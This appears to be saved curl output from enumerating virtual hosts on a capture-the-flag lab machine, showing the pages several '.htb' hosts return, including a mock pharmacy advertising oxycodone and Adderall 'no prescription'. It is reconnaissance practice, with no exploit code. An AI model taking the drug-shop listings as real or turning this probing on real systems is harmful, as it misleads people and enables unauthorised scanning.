+_gaq.push(['_setAccount', 'UA-112093729-1 ']);
+_gaq.push(['_trackPageview']);	
+(function() {
+	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+	ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+
+</head>
+
+<body class="category">
+
+<div id="header">
+	<div class="container">
+		<div id="utility" class="not-wide not-normal">
+		</div>
+	</div>
+</div>
+
+<div class="container" id="container">
+	<div class="row" id="logo">
+		<div class="u12"><a href="https://bestmedsupply.htb/"><img src="index_files/xrhealthy112.png" alt="Mens Health - online pharmacy"></a></div>
+	</div>
+	<div class="row" id="documents">
+		<div class="u12">
+			<ul class="documents">
+			<li>
+		<a href="https://bestmedsupply.htb/about-us.html" title="About Us">
+			About Us
+		</a>
+	</li>
+    	<li>
+		<a href="https://bestmedsupply.htb/terms-and-conditions.html" title="Terms and Conditions">
+			Terms and Conditions
+		</a>
+	</li>
+    	<li>
+		<a href="https://bestmedsupply.htb/privacy-policy.html" title="Privacy Policy">
+			Privacy Policy
+		</a>
+	</li>
+    
+		</ul>
+		</div>
+	</div>
+	
+		
+	<div id="page">
+	<div class="row">
+		<div class="u3 sidebar" id="sidebar-left">
+			<div class="box">
+			<div id="navigation">
+	<h3 id="navigation-toggle"><span>Shop by Category</span></h3>
+	<ul class="sf-menu sf-vertical sf-mobile sf-js-enabled sf-arrows">
+		<li>
+  <a href="https://bestmedsupply.htb/adhd.html" title="ADHD">ADHD</a>
+  </li><li>
+  <a href="https://bestmedsupply.htb/mens-health.html" title="Mens Health">Mens Health</a>
+  </li><li>
+  <a href="https://bestmedsupply.htb/anti-anxiety.html" title="Anti Anxiety">Anti Anxiety</a>
+  </li><li>
+  <a href="https://bestmedsupply.htb/pain-killers.html" title="Pain Killers">Pain Killers</a>
+  </li>
+					</ul>
+</div>
+			<div id="quick_search">
+	<!--<h3>Search</h3>-->
+	<form action="/index.php?_a=category" method="get">
+		<input type="hidden" name="_a" value="category" original="category">
+		<p class="btn-pair input">
+			<input name="search[keywords]" type="text" id="keywords" class="left" title="Search our store" size="18" original="Search our store" value="Search our store">
+			<button type="submit" class="right" original=""><span class="icon icon-search"></span><!--Search--></button>
+		</p>
+		<a href="https://bestmedsupply.htb/search.html">Advanced Search</a>
+	</form>
+</div>
+			</div>
+						<div class="box not-narrow not-mobile"><div id="popular_products">
+	<h3><span class="icon icon-star3"></span> Best Sellers</h3>
+	<ol>
+				<li><a href="https://bestmedsupply.htb/buy-tramadol-100mg-online-no-prescription.html" title="Buy Tramadol 100mg online no prescription ">Buy Tramadol 100mg online no prescription </a></li>
+				<li><a href="https://bestmedsupply.htb/pain-killers/buy-adderall-30mg-online.html" title="Buy Soma 350mg Online">Buy Soma 350mg Online</a></li>
+				<li><a href="https://bestmedsupply.htb/pain-killers/buy-adderall-30mg-online-p23.html" title="Buy Adderall 30mg online">Buy Adderall 30mg online</a></li>
+				<li><a href="https://bestmedsupply.htb/anti-anxiety/buy-xanax-online-1mg.html" title="Buy Soma 500mg online">Buy Soma 500mg online</a></li>
+				<li><a href="https://bestmedsupply.htb/pain-killers/buy-oxycodone-40mg-online-p9.html" title="Buy Oxycodone 40mg Online">Buy Oxycodone 40mg Online</a></li>
+				<li><a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-20mg.html" title="Buy Ritalin (Methylphenidate) 10mg Online">Buy Ritalin (Methylphenidate) 10mg Online</a></li>
+		
+	</ol>
+</div></div>		</div>
+		
+		<div class="u6" id="content">
+			<ul id="breadcrumb">
+		    	<li class="first"><a href="https://bestmedsupply.htb/">Home</a></li>
+		    			    	<li><a href="https://bestmedsupply.htb/mens-health.html">Mens Health</a></li>
+  		    	
+  		    </ul>
+			
+						<h1>Mens Health</h1>
+
+
+
+
+<form action="https://bestmedsupply.htb/mens-health.html" method="post" class="control">
+	<span class="pagination"></span>
+		<span class="sort">
+	Sort by
+	<select name="sort" class="auto_submit" original="name|ASC">
+		<option value="">-- Please Select --</option>
+				<option value="name|DESC">Name (Z-A)</option>
+				<option value="name|ASC" selected="selected">Name (A-Z)</option>
+				<option value="date_added|DESC">Date Added (Newest First)</option>
+				<option value="date_added|ASC">Date Added (Oldest First)</option>
+				<option value="price|DESC">Price (High-Low)</option>
+				<option value="price|ASC">Price (Low-High)</option>
+		
+	</select>
+	<input type="submit" value="Sort" original="Sort" style="display: none;">
+	</span>
+	</form>
+
+<div class="product-list">
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post" enctype="application/x-www-form-urlencoded" class="product addForm" id="P20">
+		<p class="image">
+			<a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-40mg-online.html" title="Buy Cialis (Tadalifil Citrate) 40mg Online">
+	  			<img src="index_files/Buy_Cialis__Tadalifil_Citrate__40mg_Online.jpg" alt="Buy Cialis (Tadalifil Citrate) 40mg Online">
+			</a>
+					</p>
+		<div class="info">
+			<p class="title"><a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-40mg-online.html" title="Buy Cialis (Tadalifil Citrate) 40mg Online">Buy Cialis (Tadalifil Citrate)…</a></p>
+			
+						<p class="price">$1.25</p>
+						
+			<p class="actions">
+				<a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-40mg-online.html" title="Buy Cialis (Tadalifil Citrate) 40mg Online">Info</a>
+								<input type="hidden" name="add[20][quantity]" value="1" class="quantity" original="1">
+				<input type="submit" value="Buy" class="btn button_add_basket" onclick="$.add2cart('P20')" original="Buy">
+							</p>
+		</div>
+	</form>
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post" enctype="application/x-www-form-urlencoded" class="product addForm" id="P19">
+		<p class="image">
+			<a href="https://bestmedsupply.htb/mens-health/buy-viagra-sildenafil-citrate-200mg.html" title="Buy Generic cialis 20 mg online (Tadalifil Citrate) 20mg  online">
+	  			<img src="index_files/Buy_Cialis__Tadalifil_Citrate__40mg_Online.jpg" alt="Buy Generic cialis 20 mg online (Tadalifil Citrate) 20mg  online">
+			</a>
+					</p>
+		<div class="info">
+			<p class="title"><a href="https://bestmedsupply.htb/mens-health/buy-viagra-sildenafil-citrate-200mg.html" title="Buy Generic cialis 20 mg online (Tadalifil Citrate) 20mg  online">Buy Generic cialis 20 mg online…</a></p>
+			
+						<p class="price">$0.90</p>
+						
+			<p class="actions">
+				<a href="https://bestmedsupply.htb/mens-health/buy-viagra-sildenafil-citrate-200mg.html" title="Buy Generic cialis 20 mg online (Tadalifil Citrate) 20mg  online">Info</a>
+								<input type="hidden" name="add[19][quantity]" value="1" class="quantity" original="1">
+				<input type="submit" value="Buy" class="btn button_add_basket" onclick="$.add2cart('P19')" original="Buy">
+							</p>
+		</div>
+	</form>
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post" enctype="application/x-www-form-urlencoded" class="product addForm" id="P22">
+		<p class="image">
+			<a href="https://bestmedsupply.htb/mens-health/buy-levitra-vardenafil-10-mg-online.html" title="Buy Levitra (Vardenafil) 10 mg online">
+	  			<img src="index_files/Buy_Levitra__Vardenafil__10_mg_online.jpg" alt="Buy Levitra (Vardenafil) 10 mg online">
+			</a>
+					</p>
+		<div class="info">
+			<p class="title"><a href="https://bestmedsupply.htb/mens-health/buy-levitra-vardenafil-10-mg-online.html" title="Buy Levitra (Vardenafil) 10 mg online">Buy Levitra (Vardenafil) 10 mg online</a></p>
+			
+						<p class="price">$1.10</p>
+						
+			<p class="actions">
+				<a href="https://bestmedsupply.htb/mens-health/buy-levitra-vardenafil-10-mg-online.html" title="Buy Levitra (Vardenafil) 10 mg online">Info</a>
+								<input type="hidden" name="add[22][quantity]" value="1" class="quantity" original="1">
+				<input type="submit" value="Buy" class="btn button_add_basket" onclick="$.add2cart('P22')" original="Buy">
+							</p>
+		</div>
+	</form>
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post" enctype="application/x-www-form-urlencoded" class="product addForm" id="P17">
+		<p class="image">
+			<a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-20mg.html" title="Buy Ritalin (Methylphenidate) 10mg Online">
+	  			<img src="index_files/Ritalin__Methylphenidate__10mg.jpg" alt="Buy Ritalin (Methylphenidate) 10mg Online">
+			</a>
+					</p>
+		<div class="info">
+			<p class="title"><a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-20mg.html" title="Buy Ritalin (Methylphenidate) 10mg Online">Buy Ritalin (Methylphenidate)…</a></p>
+			
+						<p class="price">$0.95</p>
+						
+			<p class="actions">
+				<a href="https://bestmedsupply.htb/mens-health/buy-cialis-tadalifil-citrate-20mg.html" title="Buy Ritalin (Methylphenidate) 10mg Online">Info</a>
+								<input type="hidden" name="add[17][quantity]" value="1" class="quantity" original="1">
+				<input type="submit" value="Buy" class="btn button_add_basket" onclick="$.add2cart('P17')" original="Buy">
+							</p>
+		</div>
+	</form>
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post" enctype="application/x-www-form-urlencoded" class="product addForm" id="P18">
+		<p class="image">
+			<a href="https://bestmedsupply.htb/mens-health/buy-viagra-sildenafil-citrate-100mg-online.html" title="Buy Viagra (Sildenafil Citrate) 100mg Online">
+	  			<img src="index_files/Buy_Viagra__Sildenafil_Citrate__100mg_Online.jpg" alt="Buy Viagra (Sildenafil Citrate) 100mg Online">
+			</a>
+					</p>
+		<div class="info">
+			<p class="title"><a href="https://bestmedsupply.htb/mens-health/buy-viagra-sildenafil-citrate-100mg-online.html" title="Buy Viagra (Sildenafil Citrate) 100mg Online">Buy Viagra (Sildenafil Citrate)…</a></p>
+			
+						<p class="price">$0.75</p>
+						
+			<p class="actions">
+				<a href="https://bestmedsupply.htb/mens-health/buy-viagra-sildenafil-citrate-100mg-online.html" title="Buy Viagra (Sildenafil Citrate) 100mg Online">Info</a>
+								<input type="hidden" name="add[18][quantity]" value="1" class="quantity" original="1">
+				<input type="submit" value="Buy" class="btn button_add_basket" onclick="$.add2cart('P18')" original="Buy">
+							</p>
+		</div>
+	</form>
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post" enctype="application/x-www-form-urlencoded" class="product addForm" id="P21">
+		<p class="image">
+			<a href="https://bestmedsupply.htb/buy-viagra-sildenafil-citrate-200mg.html" title="Buy Viagra (Sildenafil Citrate) 200mg">
+	  			<img src="index_files/Buy_Viagra__Sildenafil_Citrate__200mg.jpg" alt="Buy Viagra (Sildenafil Citrate) 200mg">
+			</a>
+					</p>
+		<div class="info">
+			<p class="title"><a href="https://bestmedsupply.htb/buy-viagra-sildenafil-citrate-200mg.html" title="Buy Viagra (Sildenafil Citrate) 200mg">Buy Viagra (Sildenafil Citrate) 200mg</a></p>
+			
+						<p class="price">$0.85</p>
+						
+			<p class="actions">
+				<a href="https://bestmedsupply.htb/buy-viagra-sildenafil-citrate-200mg.html" title="Buy Viagra (Sildenafil Citrate) 200mg">Info</a>
+								<input type="hidden" name="add[21][quantity]" value="1" class="quantity" original="1">
+				<input type="submit" value="Buy" class="btn button_add_basket" onclick="$.add2cart('P21')" original="Buy">
+							</p>
+		</div>
+	</form>
+	
+</div>
+
+<form action="https://bestmedsupply.htb/mens-health.html" method="post" class="control">
+	<span class="pagination"></span>
+		<span class="sort">
+	Sort by
+	<select name="sort" class="auto_submit" original="name|ASC">
+	  <option value="">-- Please Select --</option>
+	  	  <option value="name|DESC">Name (Z-A)</option>
+	  	  <option value="name|ASC" selected="selected">Name (A-Z)</option>
+	  	  <option value="date_added|DESC">Date Added (Newest First)</option>
+	  	  <option value="date_added|ASC">Date Added (Oldest First)</option>
+	  	  <option value="price|DESC">Price (High-Low)</option>
+	  	  <option value="price|ASC">Price (Low-High)</option>
+	  
+	</select>
+	<input type="submit" value="Sort" original="Sort" style="display: none;">
+	</span>
+	</form>
+
+		</div>
+		
+		<div class="u3 sidebar not-narrow" id="sidebar-right">
+			<div class="box not-mobile" id="sessionbox">
+			<div id="session">
+		<p id="session_false">
+		<a href="https://bestmedsupply.htb/login.html" title="Log In" class="btn"><span class="icon icon-login"></span> Log In</a> or <a href="https://bestmedsupply.htb/register.html" title="Register" class="btn">Register</a>
+	</p>
+	</div>
+			<br>
+			<div id="basket_summary">
+  <h3 class="not-narrow not-mobile"><span class="icon icon-basket"></span> Your Shopping Basket</h3>
+    <p class="not-narrow not-mobile">Your basket is empty.</p>
+    <p class="basket_total">
+  	<span class="not-narrow not-mobile">Total:</span>
+  	<span class="icon icon-basket not-wide not-normal"></span>
+  	<b>$0.00</b>
+  </p>
+  <p class="view_basket"><a href="https://bestmedsupply.htb/index.php?_a=basket" title="View Basket" class="btn">View Basket</a></p>
+</div>
+			</div>
+			<div class="box not-narrow not-mobile" id="randombox"><div id="featured_product">
+	<form action="https://bestmedsupply.htb/mens-health.html" method="post" class="top addForm" enctype="application/x-www-form-urlencoded">
+		<h3>Featured Product</h3>
+		<p class="image">
+			<a href="https://bestmedsupply.htb/pain-killers/buy-oxycodone-40mg-online-p9.html" title="Buy Oxycodone 40mg Online"><img src="index_files/Buy_Oxycodone_40mg_Online.png" alt="Buy Oxycodone 40mg Online"></a>
+		</p>
+		<p class="title"><a href="https://bestmedsupply.htb/pain-killers/buy-oxycodone-40mg-online-p9.html" title="Buy Oxycodone 40mg Online">Buy Oxycodone 40mg Online</a></p>
+				<p class="price">$1.75</p>
+						<div class="button">
+			<input type="hidden" name="add[9][quantity]" value="1" original="1">
+			<input type="submit" class="button_add_basket" value="Buy now" original="Buy now">
+		</div>
+			</form>
+</div></div>
+			<div class="box not-mobile" id="maillistbox"><div id="mailing_list">
+	<h3><span class="icon icon-envelope"></span> Mailing List</h3>
+		<form action="https://bestmedsupply.htb/mens-health.html" method="post">
+		<p>Enter your e-mail address to receive our newsletter</p>
+		<p class="btn-pair input">
+			<input name="subscribe" type="text" class="required left" size="18" maxlength="250" title="Email" original="Email" value="Email">
+			<input type="submit" class="submit right" value="Subscribe" original="Subscribe">
+		</p>
+	</form>
+	</div></div>		</div>
+	</div>
+	</div>
+	
+	<div id="footer">
+		<div class="row">
+			<div class="u12">
+				
+			</div>
+		</div>
+		<div class="row">
+						<div class="u2"><form id="language_select" action="https://bestmedsupply.htb/mens-health.html" method="post">
+	<!--Change Language-->
+	<select name="set_language" class="auto_submit" original="en-US">
+				<option value="en-GB">English (UK)</option>
+				<option value="en-US" selected="selected">English (US)</option>
+		
+	</select>
+	<input type="submit" value="Submit" original="Submit" style="display: none;">
+</form></div>
+									<div class="u2"><form id="currency_select" action="https://bestmedsupply.htb/mens-health.html" method="post">
+	<!--Change Currency-->
+	<select name="set_currency" class="auto_submit" original="USD">
+				<option value="USD" selected="selected" title="United States dollar">$ USD </option>
+				<option value="JPY" title="Japanese yen">¥ JPY </option>
+				<option value="GBP" title="Pound Sterling">£ GBP </option>
+				<option value="CAD" title="Canadian Dollar">$ CAD </option>
+				<option value="EUR" title="Euro">€ EUR </option>
+				<option value="AUD" title="Australian Dollar">$ AUD </option>
+		
+	</select>
+	<input type="submit" value="Submit" original="Submit" style="display: none;">
+</form></div>
+											</div>
+	</div>
+</div>
+
+
+
+<!-- Load JavaScript last -->
+<script type="text/javascript" src="index_files/jquery.js"></script>
+<script type="text/javascript" src="index_files/jquery-ui.js"></script>
+<script type="text/javascript" src="index_files/plugins.php"></script>
+<script type="text/javascript" src="index_files/common.js"></script>
+
+
+
+<script type="text/javascript" src="index_files/modernizr.js"></script>
+<script>
+
+Modernizr.load([
+    {
+        test: window.matchMedia,
+        nope: "https://bestmedsupply.htb/skins/e-tone/js/media.match.min.js"
+    },
+    
+    "https://bestmedsupply.htb/skins/e-tone/js/enquire.min.js",
+    "https://bestmedsupply.htb/skins/e-tone/js/superfish.js",
+    "https://bestmedsupply.htb/skins/e-tone/js/script.js"
+    
+]);
+</script>
+
+<!--[if IE 7]>
+<script type="text/javascript">
+$('.row > *').each(function(){
+	var fullW = $(this).outerWidth(),
+	actualW = $(this).width(),
+	wDiff = fullW - actualW,
+	newW = actualW - wDiff;
+	$(this).css('width',newW);
+});
+</script>
+<script type="text/javascript" src="{$STORE_URL}/skins/{$SKIN_FOLDER}/icomoon/ie7/ie7.js"></script>
+<![endif]-->
+
+  
+
+
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cbox* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+Content" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious" original=""></button><button type="button" id="cboxNext" original=""></button><button type="button" id="cboxSlideshow" original=""></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
+
+custoomercare.megabank.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: custoomercare.megabank.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:11 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 521
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>WARNING!</title>
+        <embed src="/kill-alarm.webm" volume="100" height="0" width="0" autostart="true" loop="true"  width="0" height="0">
+    </head>
+        <style type="text/css">
+            body {
+                background-color: #A4000F;
+            }
+            img {
+            width: 90%;
+            height: auto;
+        }
+        </style>
+    </head>
+    <body>
+        <center>
+            <img src="/warning.png"/>
+
+        </center>
+    </body>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</html>
+
+flowerzrus.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: flowerzrus.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:11 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3480
+< 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Floral Design</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link href="css/styles.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<div id="container">
+  <div id="topLine"></div>
+  <div id="logoPan"> <img src="images/logo.gif" width="192" height="92" alt="" id="logo" /> <img src="images/slogan.gif" width="297" height="46" alt="" id="slogan" /> </div>
+  <div id="menuPan">
+    <ul class="menu">
+      <li class="btn_1"><a href="#">home page</a></li>
+      <li class="line"></li>
+      <li class="btn_2"><a href="#">about us</a></li>
+      <li class="line"></li>
+      <li class="btn_3"><a href="#">bouquets</a></li>
+      <li class="line"></li>
+      <li class="btn_4"><a href="#">specials</a></li>
+      <li class="line"></li>
+      <li class="btn_5"><a href="#">contacts</a></li>
+    </ul>
+  </div>
+  <div id="header"> <img src="images/slogan2.gif" width="192" height="70" alt="" id="slogan2" /></div>
+  <div id="content">
+    <div id="leftPan">
+      <div id="welcome">
+        <h2></h2>
+        <img src="images/img_welcome.jpg" width="172" height="56" alt="" />
+        <p class="headline">Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc. </p>
+        <p>Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc. In volutpat sodales ipsum. Sed vestibulum. Integer in ante. Sed Nunc laoreet lacinia nunc. In volutpat sodales </p>
+      </div>
+    </div>
+    <div id="rightPan">
+      <div id="featured">
+        <h2></h2>
+        <p class="headline">Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc.Nam eu nulla. Donec lobortis purus vel urna. Nunc laoreet lacinia nunc. In volutpat sodales ipsum. </p>
+        <div class="featItem" id="i01"> <img src="images/img_prod.jpg" width="116" height="125" alt="" />
+          <p><span class="headline2">Morbi volutpat leo in</span><br />
+            <a href="#">Nam eu nulla. Donec</a><br />
+            lobortis purus vel urna. Nunc laoreet lacinia nunc</p>
+        </div>
+        <div class="featItem" id="i02"> <img src="images/img_prod-13.jpg" width="116" height="125" alt="" />
+          <p><span class="headline2">Morbi volutpat leo in</span><br />
+            <a href="#">Nam eu nulla. Donec</a><br />
+            lobortis purus vel urna. Nunc laoreet lacinia nunc</p>
+        </div>
+        <div class="featItem" id="i03"> <img src="images/img_prod-14.jpg" width="116" height="125" alt="" />
+          <p><span class="headline2">Morbi volutpat leo in</span><br />
+            <a href="#">Nam eu nulla. Donec</a><br />
+            lobortis purus vel urna. Nunc laoreet lacinia nunc</p>
+        </div>
+        <div class="clear"></div>
+      </div>
+    </div>
+    <div class="clear" id="end"></div>
+  </div>
+</div>
+<div id="footer">
+  <p><a href="#">HOME PAGE</a> | <a href="#">ABOUT US</a> | <a href="#">BOUTQUETS</a> | <a href="#">SPECIALS</a> | <a href="#">NEWS</a> | <a href="#">CONTACTS</a><br/>
+    Copyright &copy; Your Company Name | Design by <a href="http://freshtemplates.com/">Website Templates</a></p>
+</div>
+<div align=center>This template  downloaded form <a href='http://all-free-download.com/free-website-templates/'>free website templates</a></div></body>
+</html>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+
+
+chocolateriver.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: chocolateriver.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:11 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 491
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <style type="text/css">
+            body {
+                background-color: #000;
+            }
+            img {
+            width: 100%;
+            height: auto;
+        }
+        </style>
+    </head>
+    <body>
+        <center>
+            <video width=100% controls>
+              <source src="chocoriver.mp4" type="video/mp4">
+              Your browser does not support HTML5 video.
+            </video>
+        </center>
+    </body>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</html>
+
+meetspinz.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
